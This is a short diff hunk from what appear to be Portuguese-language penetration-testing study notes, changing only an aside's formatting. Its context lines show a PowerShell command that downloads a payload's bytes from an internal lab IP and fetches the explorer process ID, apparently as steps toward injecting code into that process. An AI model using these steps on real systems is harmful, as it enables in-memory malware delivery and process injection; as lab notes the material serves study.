@@ -13,8 +13,6 @@ $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.196/m
 $procid = (Get-Process -Name explorer).Id
 ```
 
-<aside>
-💡
 
 também podemos ver o Process ID manualmente com “Echo (Get-Process -Name explorer).Id”
 
